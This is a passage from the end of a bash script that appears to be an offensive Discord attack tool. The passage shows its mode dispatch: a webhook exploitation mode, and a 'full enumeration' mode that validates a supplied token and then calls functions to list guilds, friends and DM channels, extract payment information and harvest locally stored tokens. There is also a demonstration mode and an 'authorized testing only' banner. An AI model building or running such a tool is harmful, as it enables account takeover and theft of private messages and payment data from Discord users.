        [ "$TEST_MODE" != "true" ] && log_to_file "Starting webhook exploitation"
        
        if [ -z "$WEBHOOK_URL" ]; then
            echo -e "${RED}[✗]${RESET} No webhook URL provided"
            echo -e "${DIM}Set NULLSEC_WEBHOOK_URL or run in interactive mode${RESET}"
            exit 1
        fi
        
        test_webhook "$WEBHOOK_URL"
        ;;
        
    full_enum)
        echo -e "${CYAN}[*]${RESET} Mode: Full Enumeration"
        [ "$TEST_MODE" != "true" ] && log_to_file "Starting full Discord enumeration"
        
        if [ -z "$DISCORD_TOKEN" ]; then
            echo -e "${RED}[✗]${RESET} No token provided"
            exit 1
        fi
        
        if validate_token "$DISCORD_TOKEN"; then
            check_nitro "$DISCORD_TOKEN"
            enumerate_guilds "$DISCORD_TOKEN"
            enumerate_relationships "$DISCORD_TOKEN"
            extract_dm_channels "$DISCORD_TOKEN"
            extract_payment_info "$DISCORD_TOKEN"
        fi
        
        extract_local_tokens "$EXTRACT_PATH"
        ;;
        
    *)
        echo -e "${RED}[✗]${RESET} Unknown attack mode: $ATTACK_MODE"
        [ "$TEST_MODE" != "true" ] && log_to_file "Error: Unknown attack mode"
        exit 1
        ;;
esac

echo -e "\n${GREEN}[✓]${RESET} Attack completed"
if [ "$TEST_MODE" = "true" ]; then
    test_log "STEP" "============================================================"
    test_log "STEP" "=== MODULE EXECUTION COMPLETE ==="
    test_log "STEP" "============================================================"
    echo ""
    test_log "STAT" "Verbose mode analysis complete"
    test_log "STAT" "All operations executed in demonstration mode"
    test_log "STAT" "No real API connections established"
    test_log "STAT" "No actual data exfiltrated from Discord"
    echo ""
    
    # Print detailed statistics summary
    print_stats_summary
    
    echo -e "${CYAN}[*]${RESET} Verbose execution completed successfully"
else
    echo -e "${CYAN}[*]${RESET} Results saved to: $TARGET_DIR"
    log_to_file "Discord TLO attack completed successfully"
fi

echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}  ⚠️  REMEMBER: This tool is for authorized testing only!${RESET}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
